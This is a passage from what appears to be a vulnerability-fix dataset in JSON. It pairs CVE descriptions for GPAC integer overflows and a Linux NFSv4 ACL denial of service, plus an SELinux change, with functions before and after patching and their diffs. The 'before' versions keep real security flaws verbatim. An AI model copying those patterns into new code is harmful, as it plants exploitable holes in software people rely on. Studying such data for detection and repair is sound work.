        "commit_title": "The SELinux hooks invoke ipv6_skip_exthdr() with an incorrect",
        "commit_text": "length final argument.  However, the length argument turns out to be superfluous.  I was just reading ipv6_skip_exthdr and it occured to me that we can get rid of len altogether.  The only place where len is used is to check whether the skb has two bytes for ipv6_opt_hdr.  This check is done by skb_header_pointer/skb_copy_bits anyway.  Now it might appear that we've made the code slower by deferring the check to skb_copy_bits.  However, this check should not trigger in the common case so this is OK.  ",
        "func_before": "static int selinux_parse_skb_ipv6(struct sk_buff *skb, struct avc_audit_data *ad)\n{\n\tu8 nexthdr;\n\tint ret = -EINVAL, offset;\n\tstruct ipv6hdr _ipv6h, *ip6;\n\n\toffset = skb->nh.raw - skb->data;\n\tip6 = skb_header_pointer(skb, offset, sizeof(_ipv6h), &_ipv6h);\n\tif (ip6 == NULL)\n\t\tgoto out;\n\n\tipv6_addr_copy(&ad->u.net.v6info.saddr, &ip6->saddr);\n\tipv6_addr_copy(&ad->u.net.v6info.daddr, &ip6->daddr);\n\tret = 0;\n\n\tnexthdr = ip6->nexthdr;\n\toffset += sizeof(_ipv6h);\n\toffset = ipv6_skip_exthdr(skb, offset, &nexthdr,\n\t\t\t\t  skb->tail - skb->head - offset);\n\tif (offset < 0)\n\t\tgoto out;\n\n\tswitch (nexthdr) {\n\tcase IPPROTO_TCP: {\n        \tstruct tcphdr _tcph, *th;\n\n\t\tth = skb_header_pointer(skb, offset, sizeof(_tcph), &_tcph);\n\t\tif (th == NULL)\n\t\t\tbreak;\n\n\t\tad->u.net.sport = th->source;\n\t\tad->u.net.dport = th->dest;\n\t\tbreak;\n\t}\n\n\tcase IPPROTO_UDP: {\n\t\tstruct udphdr _udph, *uh;\n\n\t\tuh = skb_header_pointer(skb, offset, sizeof(_udph), &_udph);\n\t\tif (uh == NULL)\n\t\t\tbreak;\n\n\t\tad->u.net.sport = uh->source;\n\t\tad->u.net.dport = uh->dest;\n\t\tbreak;\n\t}\n\n\t/* includes fragments */\n\tdefault:\n\t\tbreak;\n\t}\nout:\n\treturn ret;\n}",
        "func": "static int selinux_parse_skb_ipv6(struct sk_buff *skb, struct avc_audit_data *ad)\n{\n\tu8 nexthdr;\n\tint ret = -EINVAL, offset;\n\tstruct ipv6hdr _ipv6h, *ip6;\n\n\toffset = skb->nh.raw - skb->data;\n\tip6 = skb_header_pointer(skb, offset, sizeof(_ipv6h), &_ipv6h);\n\tif (ip6 == NULL)\n\t\tgoto out;\n\n\tipv6_addr_copy(&ad->u.net.v6info.saddr, &ip6->saddr);\n\tipv6_addr_copy(&ad->u.net.v6info.daddr, &ip6->daddr);\n\tret = 0;\n\n\tnexthdr = ip6->nexthdr;\n\toffset += sizeof(_ipv6h);\n\toffset = ipv6_skip_exthdr(skb, offset, &nexthdr);\n\tif (offset < 0)\n\t\tgoto out;\n\n\tswitch (nexthdr) {\n\tcase IPPROTO_TCP: {\n        \tstruct tcphdr _tcph, *th;\n\n\t\tth = skb_header_pointer(skb, offset, sizeof(_tcph), &_tcph);\n\t\tif (th == NULL)\n\t\t\tbreak;\n\n\t\tad->u.net.sport = th->source;\n\t\tad->u.net.dport = th->dest;\n\t\tbreak;\n\t}\n\n\tcase IPPROTO_UDP: {\n\t\tstruct udphdr _udph, *uh;\n\n\t\tuh = skb_header_pointer(skb, offset, sizeof(_udph), &_udph);\n\t\tif (uh == NULL)\n\t\t\tbreak;\n\n\t\tad->u.net.sport = uh->source;\n\t\tad->u.net.dport = uh->dest;\n\t\tbreak;\n\t}\n\n\t/* includes fragments */\n\tdefault:\n\t\tbreak;\n\t}\nout:\n\treturn ret;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -15,8 +15,7 @@\n \n \tnexthdr = ip6->nexthdr;\n \toffset += sizeof(_ipv6h);\n-\toffset = ipv6_skip_exthdr(skb, offset, &nexthdr,\n-\t\t\t\t  skb->tail - skb->head - offset);\n+\toffset = ipv6_skip_exthdr(skb, offset, &nexthdr);\n \tif (offset < 0)\n \t\tgoto out;\n ",
        "diff_line_info": {
            "deleted_lines": [
                "\toffset = ipv6_skip_exthdr(skb, offset, &nexthdr,",
                "\t\t\t\t  skb->tail - skb->head - offset);"
            ],
            "added_lines": [
                "\toffset = ipv6_skip_exthdr(skb, offset, &nexthdr);"
            ]
        }
    },
    {
        "cve_id": "CVE-2022-4202",
        "func_name": "gpac/lsr_translate_coords",
        "description": "A vulnerability, which was classified as problematic, was found in GPAC 2.1-DEV-rev490-g68064e101-master. Affected is the function lsr_translate_coords of the file laser/lsr_dec.c. The manipulation leads to integer overflow. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. The name of the patch is b3d821c4ae9ba62b3a194d9dcb5e99f17bd56908. It is recommended to apply a patch to fix this issue. VDB-214518 is the identifier assigned to this vulnerability.",
        "git_url": "https://github.com/gpac/gpac/commit/b3d821c4ae9ba62b3a194d9dcb5e99f17bd56908",
        "commit_title": "fixed #2333",
        "commit_text": "",
        "func_before": "static Fixed lsr_translate_coords(GF_LASeRCodec *lsr, u32 val, u32 nb_bits)\n{\n\tif (!nb_bits) return 0;\n\t\n#ifdef GPAC_FIXED_POINT\n\tif (val >> (nb_bits-1) ) {\n\t\ts32 neg = (s32) val - (1<<nb_bits);\n\t\tif (neg < -FIX_ONE / 2)\n\t\t\treturn 2 * gf_divfix(INT2FIX(neg/2), lsr->res_factor);\n\t\treturn gf_divfix(INT2FIX(neg), lsr->res_factor);\n\t} else {\n\t\tif (val > FIX_ONE / 2)\n\t\t\treturn 2 * gf_divfix(INT2FIX(val/2), lsr->res_factor);\n\t\treturn gf_divfix(INT2FIX(val), lsr->res_factor);\n\t}\n#else\n\tif (val >> (nb_bits-1) ) {\n\t\ts32 neg = (s32) val - (1<<nb_bits);\n\t\treturn gf_divfix(INT2FIX(neg), lsr->res_factor);\n\t} else {\n\t\treturn gf_divfix(INT2FIX(val), lsr->res_factor);\n\t}\n#endif\n}",
        "func": "static Fixed lsr_translate_coords(GF_LASeRCodec *lsr, u32 val, u32 nb_bits)\n{\n\tif (!nb_bits) return 0;\n\tif (nb_bits>=32) return 0;\n\n#ifdef GPAC_FIXED_POINT\n\tif (val >> (nb_bits-1) ) {\n\t\ts64 neg = (s64) val - (0x00000001UL << nb_bits);\n\t\tif (neg < -FIX_ONE / 2)\n\t\t\treturn 2 * gf_divfix(INT2FIX(neg/2), lsr->res_factor);\n\t\treturn gf_divfix(INT2FIX(neg), lsr->res_factor);\n\t} else {\n\t\tif (val > FIX_ONE / 2)\n\t\t\treturn 2 * gf_divfix(INT2FIX(val/2), lsr->res_factor);\n\t\treturn gf_divfix(INT2FIX(val), lsr->res_factor);\n\t}\n#else\n\tif (val >> (nb_bits-1) ) {\n\t\ts64 neg = (s64) val - (0x00000001UL << nb_bits);\n\t\treturn ((Fixed)neg) / lsr->res_factor;\n\t} else {\n\t\treturn ((Fixed)val) / lsr->res_factor;\n\t}\n#endif\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -1,10 +1,11 @@\n static Fixed lsr_translate_coords(GF_LASeRCodec *lsr, u32 val, u32 nb_bits)\n {\n \tif (!nb_bits) return 0;\n-\t\n+\tif (nb_bits>=32) return 0;\n+\n #ifdef GPAC_FIXED_POINT\n \tif (val >> (nb_bits-1) ) {\n-\t\ts32 neg = (s32) val - (1<<nb_bits);\n+\t\ts64 neg = (s64) val - (0x00000001UL << nb_bits);\n \t\tif (neg < -FIX_ONE / 2)\n \t\t\treturn 2 * gf_divfix(INT2FIX(neg/2), lsr->res_factor);\n \t\treturn gf_divfix(INT2FIX(neg), lsr->res_factor);\n@@ -15,10 +16,10 @@\n \t}\n #else\n \tif (val >> (nb_bits-1) ) {\n-\t\ts32 neg = (s32) val - (1<<nb_bits);\n-\t\treturn gf_divfix(INT2FIX(neg), lsr->res_factor);\n+\t\ts64 neg = (s64) val - (0x00000001UL << nb_bits);\n+\t\treturn ((Fixed)neg) / lsr->res_factor;\n \t} else {\n-\t\treturn gf_divfix(INT2FIX(val), lsr->res_factor);\n+\t\treturn ((Fixed)val) / lsr->res_factor;\n \t}\n #endif\n }",
        "diff_line_info": {
            "deleted_lines": [
                "\t",
                "\t\ts32 neg = (s32) val - (1<<nb_bits);",
                "\t\ts32 neg = (s32) val - (1<<nb_bits);",
                "\t\treturn gf_divfix(INT2FIX(neg), lsr->res_factor);",
                "\t\treturn gf_divfix(INT2FIX(val), lsr->res_factor);"
            ],
            "added_lines": [
                "\tif (nb_bits>=32) return 0;",
                "",
                "\t\ts64 neg = (s64) val - (0x00000001UL << nb_bits);",
                "\t\ts64 neg = (s64) val - (0x00000001UL << nb_bits);",
                "\t\treturn ((Fixed)neg) / lsr->res_factor;",
                "\t\treturn ((Fixed)val) / lsr->res_factor;"
            ]
        }
    },
    {
        "cve_id": "CVE-2022-4202",
        "func_name": "gpac/lsr_translate_scale",
        "description": "A vulnerability, which was classified as problematic, was found in GPAC 2.1-DEV-rev490-g68064e101-master. Affected is the function lsr_translate_coords of the file laser/lsr_dec.c. The manipulation leads to integer overflow. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. The name of the patch is b3d821c4ae9ba62b3a194d9dcb5e99f17bd56908. It is recommended to apply a patch to fix this issue. VDB-214518 is the identifier assigned to this vulnerability.",
        "git_url": "https://github.com/gpac/gpac/commit/b3d821c4ae9ba62b3a194d9dcb5e99f17bd56908",
        "commit_title": "fixed #2333",
        "commit_text": "",
        "func_before": "static Fixed lsr_translate_scale(GF_LASeRCodec *lsr, u32 val)\n{\n\tif (val >> (lsr->coord_bits-1) ) {\n\t\ts32 v = val - (1<<lsr->coord_bits);\n\t\treturn INT2FIX(v) / 256 ;\n\t} else {\n\t\treturn INT2FIX(val) / 256;\n\t}\n}",
        "func": "static Fixed lsr_translate_scale(GF_LASeRCodec *lsr, u32 val)\n{\n\tif (val >> (lsr->coord_bits-1) ) {\n\t\ts64 v = val - (0x00000001UL << lsr->coord_bits);\n\t\treturn INT2FIX(v) / 256 ;\n\t} else {\n\t\treturn INT2FIX(val) / 256;\n\t}\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -1,7 +1,7 @@\n static Fixed lsr_translate_scale(GF_LASeRCodec *lsr, u32 val)\n {\n \tif (val >> (lsr->coord_bits-1) ) {\n-\t\ts32 v = val - (1<<lsr->coord_bits);\n+\t\ts64 v = val - (0x00000001UL << lsr->coord_bits);\n \t\treturn INT2FIX(v) / 256 ;\n \t} else {\n \t\treturn INT2FIX(val) / 256;",
        "diff_line_info": {
            "deleted_lines": [
                "\t\ts32 v = val - (1<<lsr->coord_bits);"
            ],
            "added_lines": [
                "\t\ts64 v = val - (0x00000001UL << lsr->coord_bits);"
            ]
        }
    },
    {
        "cve_id": "CVE-2022-4202",
        "func_name": "gpac/lsr_read_extend_class",
        "description": "A vulnerability, which was classified as problematic, was found in GPAC 2.1-DEV-rev490-g68064e101-master. Affected is the function lsr_translate_coords of the file laser/lsr_dec.c. The manipulation leads to integer overflow. It is possible to launch the attack remotely. The exploit has been disclosed to the public and may be used. The name of the patch is b3d821c4ae9ba62b3a194d9dcb5e99f17bd56908. It is recommended to apply a patch to fix this issue. VDB-214518 is the identifier assigned to this vulnerability.",
        "git_url": "https://github.com/gpac/gpac/commit/b3d821c4ae9ba62b3a194d9dcb5e99f17bd56908",
        "commit_title": "fixed #2333",
        "commit_text": "",
        "func_before": "static void lsr_read_extend_class(GF_LASeRCodec *lsr, char **out_data, u32 *out_len, const char *name)\n{\n\tu32 len;\n\tGF_LSR_READ_INT(lsr, len, lsr->info->cfg.extensionIDBits, \"reserved\");\n\tlen = lsr_read_vluimsbf5(lsr, \"len\");\n//\twhile (len) gf_bs_read_int(lsr->bs, 1);\n\tgf_bs_read_long_int(lsr->bs, len);\n\tif (out_data) *out_data = NULL;\n\tif (out_len) *out_len = 0;\n}",
        "func": "static void lsr_read_extend_class(GF_LASeRCodec *lsr, char **out_data, u32 *out_len, const char *name)\n{\n\tu32 len, blen;\n\tGF_LSR_READ_INT(lsr, len, lsr->info->cfg.extensionIDBits, \"reserved\");\n\tlen = lsr_read_vluimsbf5(lsr, \"len\");\n\twhile (len && !gf_bs_is_align(lsr->bs)) {\n\t\tgf_bs_read_int(lsr->bs, len);\n\t\tlen--;\n\t}\n\tblen = len / 8;\n\tgf_bs_skip_bytes(lsr->bs, blen);\n\tlen -= blen*8;\n\n\twhile (len) {\n\t\tgf_bs_read_int(lsr->bs, 1);\n\t\tlen--;\n\t}\n\tif (out_data) *out_data = NULL;\n\tif (out_len) *out_len = 0;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -1,10 +1,20 @@\n static void lsr_read_extend_class(GF_LASeRCodec *lsr, char **out_data, u32 *out_len, const char *name)\n {\n-\tu32 len;\n+\tu32 len, blen;\n \tGF_LSR_READ_INT(lsr, len, lsr->info->cfg.extensionIDBits, \"reserved\");\n \tlen = lsr_read_vluimsbf5(lsr, \"len\");\n-//\twhile (len) gf_bs_read_int(lsr->bs, 1);\n-\tgf_bs_read_long_int(lsr->bs, len);\n+\twhile (len && !gf_bs_is_align(lsr->bs)) {\n+\t\tgf_bs_read_int(lsr->bs, len);\n+\t\tlen--;\n+\t}\n+\tblen = len / 8;\n+\tgf_bs_skip_bytes(lsr->bs, blen);\n+\tlen -= blen*8;\n+\n+\twhile (len) {\n+\t\tgf_bs_read_int(lsr->bs, 1);\n+\t\tlen--;\n+\t}\n \tif (out_data) *out_data = NULL;\n \tif (out_len) *out_len = 0;\n }",
        "diff_line_info": {
            "deleted_lines": [
                "\tu32 len;",
                "//\twhile (len) gf_bs_read_int(lsr->bs, 1);",
                "\tgf_bs_read_long_int(lsr->bs, len);"
            ],
            "added_lines": [
                "\tu32 len, blen;",
                "\twhile (len && !gf_bs_is_align(lsr->bs)) {",
                "\t\tgf_bs_read_int(lsr->bs, len);",
                "\t\tlen--;",
                "\t}",
                "\tblen = len / 8;",
                "\tgf_bs_skip_bytes(lsr->bs, blen);",
                "\tlen -= blen*8;",
                "",
                "\twhile (len) {",
                "\t\tgf_bs_read_int(lsr->bs, 1);",
                "\t\tlen--;",
                "\t}"
            ]
        }
    },
    {
        "cve_id": "CVE-2011-4131",
        "func_name": "torvalds/linux/nfs4_proc_get_acl",
        "description": "The NFSv4 implementation in the Linux kernel before 3.2.2 does not properly handle bitmap sizes in GETACL replies, which allows remote NFS servers to cause a denial of service (OOPS) by sending an excessive number of bitmap words.",
        "git_url": "https://github.com/torvalds/linux/commit/bf118a342f10dafe44b14451a1392c3254629a1f",
        "commit_title": "NFSv4: include bitmap in nfsv4 get acl data",
        "commit_text": " The NFSv4 bitmap size is unbounded: a server can return an arbitrary sized bitmap in an FATTR4_WORD0_ACL request.  Replace using the nfs4_fattr_bitmap_maxsz as a guess to the maximum bitmask returned by a server with the inclusion of the bitmap (xdr length plus bitmasks) and the acl data xdr length to the (cached) acl page data.  This is a general solution to commit e5012d1f \"NFSv4.1: update nfs4_fattr_bitmap_maxsz\" and fixes hitting a BUG_ON in xdr_shrink_bufhead when getting ACLs.  Fix a bug in decode_getacl that returned -EINVAL on ACLs > page when getxattr was called with a NULL buffer, preventing ACL > PAGE_SIZE from being retrieved.  Cc: stable@kernel.org",
        "func_before": "static ssize_t nfs4_proc_get_acl(struct inode *inode, void *buf, size_t buflen)\n{\n\tstruct nfs_server *server = NFS_SERVER(inode);\n\tint ret;\n\n\tif (!nfs4_server_supports_acls(server))\n\t\treturn -EOPNOTSUPP;\n\tret = nfs_revalidate_inode(server, inode);\n\tif (ret < 0)\n\t\treturn ret;\n\tif (NFS_I(inode)->cache_validity & NFS_INO_INVALID_ACL)\n\t\tnfs_zap_acl_cache(inode);\n\tret = nfs4_read_cached_acl(inode, buf, buflen);\n\tif (ret != -ENOENT)\n\t\treturn ret;\n\treturn nfs4_get_acl_uncached(inode, buf, buflen);\n}",
        "func": "static ssize_t nfs4_proc_get_acl(struct inode *inode, void *buf, size_t buflen)\n{\n\tstruct nfs_server *server = NFS_SERVER(inode);\n\tint ret;\n\n\tif (!nfs4_server_supports_acls(server))\n\t\treturn -EOPNOTSUPP;\n\tret = nfs_revalidate_inode(server, inode);\n\tif (ret < 0)\n\t\treturn ret;\n\tif (NFS_I(inode)->cache_validity & NFS_INO_INVALID_ACL)\n\t\tnfs_zap_acl_cache(inode);\n\tret = nfs4_read_cached_acl(inode, buf, buflen);\n\tif (ret != -ENOENT)\n\t\t/* -ENOENT is returned if there is no ACL or if there is an ACL\n\t\t * but no cached acl data, just the acl length */\n\t\treturn ret;\n\treturn nfs4_get_acl_uncached(inode, buf, buflen);\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -12,6 +12,8 @@\n \t\tnfs_zap_acl_cache(inode);\n \tret = nfs4_read_cached_acl(inode, buf, buflen);\n \tif (ret != -ENOENT)\n+\t\t/* -ENOENT is returned if there is no ACL or if there is an ACL\n+\t\t * but no cached acl data, just the acl length */\n \t\treturn ret;\n \treturn nfs4_get_acl_uncached(inode, buf, buflen);\n }",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "\t\t/* -ENOENT is returned if there is no ACL or if there is an ACL",
                "\t\t * but no cached acl data, just the acl length */"
            ]
        }
    },
    {
        "cve_id": "CVE-2011-4131",
        "func_name": "torvalds/linux/__nfs4_get_acl_uncached",
        "description": "The NFSv4 implementation in the Linux kernel before 3.2.2 does not properly handle bitmap sizes in GETACL replies, which allows remote NFS servers to cause a denial of service (OOPS) by sending an excessive number of bitmap words.",
        "git_url": "https://github.com/torvalds/linux/commit/bf118a342f10dafe44b14451a1392c3254629a1f",
        "commit_title": "NFSv4: include bitmap in nfsv4 get acl data",
        "commit_text": " The NFSv4 bitmap size is unbounded: a server can return an arbitrary sized bitmap in an FATTR4_WORD0_ACL request.  Replace using the nfs4_fattr_bitmap_maxsz as a guess to the maximum bitmask returned by a server with the inclusion of the bitmap (xdr length plus bitmasks) and the acl data xdr length to the (cached) acl page data.  This is a general solution to commit e5012d1f \"NFSv4.1: update nfs4_fattr_bitmap_maxsz\" and fixes hitting a BUG_ON in xdr_shrink_bufhead when getting ACLs.  Fix a bug in decode_getacl that returned -EINVAL on ACLs > page when getxattr was called with a NULL buffer, preventing ACL > PAGE_SIZE from being retrieved.  Cc: stable@kernel.org",
        "func_before": "static ssize_t __nfs4_get_acl_uncached(struct inode *inode, void *buf, size_t buflen)\n{\n\tstruct page *pages[NFS4ACL_MAXPAGES];\n\tstruct nfs_getaclargs args = {\n\t\t.fh = NFS_FH(inode),\n\t\t.acl_pages = pages,\n\t\t.acl_len = buflen,\n\t};\n\tstruct nfs_getaclres res = {\n\t\t.acl_len = buflen,\n\t};\n\tvoid *resp_buf;\n\tstruct rpc_message msg = {\n\t\t.rpc_proc = &nfs4_procedures[NFSPROC4_CLNT_GETACL],\n\t\t.rpc_argp = &args,\n\t\t.rpc_resp = &res,\n\t};\n\tstruct page *localpage = NULL;\n\tint ret;\n\n\tif (buflen < PAGE_SIZE) {\n\t\t/* As long as we're doing a round trip to the server anyway,\n\t\t * let's be prepared for a page of acl data. */\n\t\tlocalpage = alloc_page(GFP_KERNEL);\n\t\tresp_buf = page_address(localpage);\n\t\tif (localpage == NULL)\n\t\t\treturn -ENOMEM;\n\t\targs.acl_pages[0] = localpage;\n\t\targs.acl_pgbase = 0;\n\t\targs.acl_len = PAGE_SIZE;\n\t} else {\n\t\tresp_buf = buf;\n\t\tbuf_to_pages(buf, buflen, args.acl_pages, &args.acl_pgbase);\n\t}\n\tret = nfs4_call_sync(NFS_SERVER(inode)->client, NFS_SERVER(inode), &msg, &args.seq_args, &res.seq_res, 0);\n\tif (ret)\n\t\tgoto out_free;\n\tif (res.acl_len > args.acl_len)\n\t\tnfs4_write_cached_acl(inode, NULL, res.acl_len);\n\telse\n\t\tnfs4_write_cached_acl(inode, resp_buf, res.acl_len);\n\tif (buf) {\n\t\tret = -ERANGE;\n\t\tif (res.acl_len > buflen)\n\t\t\tgoto out_free;\n\t\tif (localpage)\n\t\t\tmemcpy(buf, resp_buf, res.acl_len);\n\t}\n\tret = res.acl_len;\nout_free:\n\tif (localpage)\n\t\t__free_page(localpage);\n\treturn ret;\n}",
        "func": "static ssize_t __nfs4_get_acl_uncached(struct inode *inode, void *buf, size_t buflen)\n{\n\tstruct page *pages[NFS4ACL_MAXPAGES] = {NULL, };\n\tstruct nfs_getaclargs args = {\n\t\t.fh = NFS_FH(inode),\n\t\t.acl_pages = pages,\n\t\t.acl_len = buflen,\n\t};\n\tstruct nfs_getaclres res = {\n\t\t.acl_len = buflen,\n\t};\n\tvoid *resp_buf;\n\tstruct rpc_message msg = {\n\t\t.rpc_proc = &nfs4_procedures[NFSPROC4_CLNT_GETACL],\n\t\t.rpc_argp = &args,\n\t\t.rpc_resp = &res,\n\t};\n\tint ret = -ENOMEM, npages, i, acl_len = 0;\n\n\tnpages = (buflen + PAGE_SIZE - 1) >> PAGE_SHIFT;\n\t/* As long as we're doing a round trip to the server anyway,\n\t * let's be prepared for a page of acl data. */\n\tif (npages == 0)\n\t\tnpages = 1;\n\n\tfor (i = 0; i < npages; i++) {\n\t\tpages[i] = alloc_page(GFP_KERNEL);\n\t\tif (!pages[i])\n\t\t\tgoto out_free;\n\t}\n\tif (npages > 1) {\n\t\t/* for decoding across pages */\n\t\targs.acl_scratch = alloc_page(GFP_KERNEL);\n\t\tif (!args.acl_scratch)\n\t\t\tgoto out_free;\n\t}\n\targs.acl_len = npages * PAGE_SIZE;\n\targs.acl_pgbase = 0;\n\t/* Let decode_getfacl know not to fail if the ACL data is larger than\n\t * the page we send as a guess */\n\tif (buf == NULL)\n\t\tres.acl_flags |= NFS4_ACL_LEN_REQUEST;\n\tresp_buf = page_address(pages[0]);\n\n\tdprintk(\"%s  buf %p buflen %ld npages %d args.acl_len %ld\\n\",\n\t\t__func__, buf, buflen, npages, args.acl_len);\n\tret = nfs4_call_sync(NFS_SERVER(inode)->client, NFS_SERVER(inode),\n\t\t\t     &msg, &args.seq_args, &res.seq_res, 0);\n\tif (ret)\n\t\tgoto out_free;\n\n\tacl_len = res.acl_len - res.acl_data_offset;\n\tif (acl_len > args.acl_len)\n\t\tnfs4_write_cached_acl(inode, NULL, acl_len);\n\telse\n\t\tnfs4_write_cached_acl(inode, resp_buf + res.acl_data_offset,\n\t\t\t\t      acl_len);\n\tif (buf) {\n\t\tret = -ERANGE;\n\t\tif (acl_len > buflen)\n\t\t\tgoto out_free;\n\t\t_copy_from_pages(buf, pages, res.acl_data_offset,\n\t\t\t\tres.acl_len);\n\t}\n\tret = acl_len;\nout_free:\n\tfor (i = 0; i < npages; i++)\n\t\tif (pages[i])\n\t\t\t__free_page(pages[i]);\n\tif (args.acl_scratch)\n\t\t__free_page(args.acl_scratch);\n\treturn ret;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -1,6 +1,6 @@\n static ssize_t __nfs4_get_acl_uncached(struct inode *inode, void *buf, size_t buflen)\n {\n-\tstruct page *pages[NFS4ACL_MAXPAGES];\n+\tstruct page *pages[NFS4ACL_MAXPAGES] = {NULL, };\n \tstruct nfs_getaclargs args = {\n \t\t.fh = NFS_FH(inode),\n \t\t.acl_pages = pages,\n@@ -15,40 +15,59 @@\n \t\t.rpc_argp = &args,\n \t\t.rpc_resp = &res,\n \t};\n-\tstruct page *localpage = NULL;\n-\tint ret;\n+\tint ret = -ENOMEM, npages, i, acl_len = 0;\n \n-\tif (buflen < PAGE_SIZE) {\n-\t\t/* As long as we're doing a round trip to the server anyway,\n-\t\t * let's be prepared for a page of acl data. */\n-\t\tlocalpage = alloc_page(GFP_KERNEL);\n-\t\tresp_buf = page_address(localpage);\n-\t\tif (localpage == NULL)\n-\t\t\treturn -ENOMEM;\n-\t\targs.acl_pages[0] = localpage;\n-\t\targs.acl_pgbase = 0;\n-\t\targs.acl_len = PAGE_SIZE;\n-\t} else {\n-\t\tresp_buf = buf;\n-\t\tbuf_to_pages(buf, buflen, args.acl_pages, &args.acl_pgbase);\n+\tnpages = (buflen + PAGE_SIZE - 1) >> PAGE_SHIFT;\n+\t/* As long as we're doing a round trip to the server anyway,\n+\t * let's be prepared for a page of acl data. */\n+\tif (npages == 0)\n+\t\tnpages = 1;\n+\n+\tfor (i = 0; i < npages; i++) {\n+\t\tpages[i] = alloc_page(GFP_KERNEL);\n+\t\tif (!pages[i])\n+\t\t\tgoto out_free;\n \t}\n-\tret = nfs4_call_sync(NFS_SERVER(inode)->client, NFS_SERVER(inode), &msg, &args.seq_args, &res.seq_res, 0);\n+\tif (npages > 1) {\n+\t\t/* for decoding across pages */\n+\t\targs.acl_scratch = alloc_page(GFP_KERNEL);\n+\t\tif (!args.acl_scratch)\n+\t\t\tgoto out_free;\n+\t}\n+\targs.acl_len = npages * PAGE_SIZE;\n+\targs.acl_pgbase = 0;\n+\t/* Let decode_getfacl know not to fail if the ACL data is larger than\n+\t * the page we send as a guess */\n+\tif (buf == NULL)\n+\t\tres.acl_flags |= NFS4_ACL_LEN_REQUEST;\n+\tresp_buf = page_address(pages[0]);\n+\n+\tdprintk(\"%s  buf %p buflen %ld npages %d args.acl_len %ld\\n\",\n+\t\t__func__, buf, buflen, npages, args.acl_len);\n+\tret = nfs4_call_sync(NFS_SERVER(inode)->client, NFS_SERVER(inode),\n+\t\t\t     &msg, &args.seq_args, &res.seq_res, 0);\n \tif (ret)\n \t\tgoto out_free;\n-\tif (res.acl_len > args.acl_len)\n-\t\tnfs4_write_cached_acl(inode, NULL, res.acl_len);\n+\n+\tacl_len = res.acl_len - res.acl_data_offset;\n+\tif (acl_len > args.acl_len)\n+\t\tnfs4_write_cached_acl(inode, NULL, acl_len);\n \telse\n-\t\tnfs4_write_cached_acl(inode, resp_buf, res.acl_len);\n+\t\tnfs4_write_cached_acl(inode, resp_buf + res.acl_data_offset,\n+\t\t\t\t      acl_len);\n \tif (buf) {\n \t\tret = -ERANGE;\n-\t\tif (res.acl_len > buflen)\n+\t\tif (acl_len > buflen)\n \t\t\tgoto out_free;\n-\t\tif (localpage)\n-\t\t\tmemcpy(buf, resp_buf, res.acl_len);\n+\t\t_copy_from_pages(buf, pages, res.acl_data_offset,\n+\t\t\t\tres.acl_len);\n \t}\n-\tret = res.acl_len;\n+\tret = acl_len;\n out_free:\n-\tif (localpage)\n-\t\t__free_page(localpage);\n+\tfor (i = 0; i < npages; i++)\n+\t\tif (pages[i])\n+\t\t\t__free_page(pages[i]);\n+\tif (args.acl_scratch)\n+\t\t__free_page(args.acl_scratch);\n \treturn ret;\n }",
        "diff_line_info": {
            "deleted_lines": [
                "\tstruct page *pages[NFS4ACL_MAXPAGES];",
                "\tstruct page *localpage = NULL;",
                "\tint ret;",
                "\tif (buflen < PAGE_SIZE) {",
                "\t\t/* As long as we're doing a round trip to the server anyway,",
                "\t\t * let's be prepared for a page of acl data. */",
                "\t\tlocalpage = alloc_page(GFP_KERNEL);",
                "\t\tresp_buf = page_address(localpage);",
                "\t\tif (localpage == NULL)",
                "\t\t\treturn -ENOMEM;",
                "\t\targs.acl_pages[0] = localpage;",
                "\t\targs.acl_pgbase = 0;",
                "\t\targs.acl_len = PAGE_SIZE;",
                "\t} else {",
                "\t\tresp_buf = buf;",
                "\t\tbuf_to_pages(buf, buflen, args.acl_pages, &args.acl_pgbase);",
                "\tret = nfs4_call_sync(NFS_SERVER(inode)->client, NFS_SERVER(inode), &msg, &args.seq_args, &res.seq_res, 0);",
                "\tif (res.acl_len > args.acl_len)",
                "\t\tnfs4_write_cached_acl(inode, NULL, res.acl_len);",
                "\t\tnfs4_write_cached_acl(inode, resp_buf, res.acl_len);",
                "\t\tif (res.acl_len > buflen)",
                "\t\tif (localpage)",
                "\t\t\tmemcpy(buf, resp_buf, res.acl_len);",
                "\tret = res.acl_len;",
                "\tif (localpage)",
                "\t\t__free_page(localpage);"
            ],
            "added_lines": [
                "\tstruct page *pages[NFS4ACL_MAXPAGES] = {NULL, };",
                "\tint ret = -ENOMEM, npages, i, acl_len = 0;",
                "\tnpages = (buflen + PAGE_SIZE - 1) >> PAGE_SHIFT;",
                "\t/* As long as we're doing a round trip to the server anyway,",
                "\t * let's be prepared for a page of acl data. */",
                "\tif (npages == 0)",
                "\t\tnpages = 1;",
                "",
                "\tfor (i = 0; i < npages; i++) {",
                "\t\tpages[i] = alloc_page(GFP_KERNEL);",
                "\t\tif (!pages[i])",
                "\t\t\tgoto out_free;",
                "\tif (npages > 1) {",
                "\t\t/* for decoding across pages */",
                "\t\targs.acl_scratch = alloc_page(GFP_KERNEL);",
                "\t\tif (!args.acl_scratch)",
                "\t\t\tgoto out_free;",
                "\t}",
                "\targs.acl_len = npages * PAGE_SIZE;",
                "\targs.acl_pgbase = 0;",
                "\t/* Let decode_getfacl know not to fail if the ACL data is larger than",
                "\t * the page we send as a guess */",
                "\tif (buf == NULL)",
                "\t\tres.acl_flags |= NFS4_ACL_LEN_REQUEST;",
                "\tresp_buf = page_address(pages[0]);",
                "",
                "\tdprintk(\"%s  buf %p buflen %ld npages %d args.acl_len %ld\\n\",",
                "\t\t__func__, buf, buflen, npages, args.acl_len);",
                "\tret = nfs4_call_sync(NFS_SERVER(inode)->client, NFS_SERVER(inode),",
                "\t\t\t     &msg, &args.seq_args, &res.seq_res, 0);",
                "",
                "\tacl_len = res.acl_len - res.acl_data_offset;",
                "\tif (acl_len > args.acl_len)",
                "\t\tnfs4_write_cached_acl(inode, NULL, acl_len);",
                "\t\tnfs4_write_cached_acl(inode, resp_buf + res.acl_data_offset,",
                "\t\t\t\t      acl_len);",
                "\t\tif (acl_len > buflen)",
                "\t\t_copy_from_pages(buf, pages, res.acl_data_offset,",
                "\t\t\t\tres.acl_len);",
                "\tret = acl_len;",
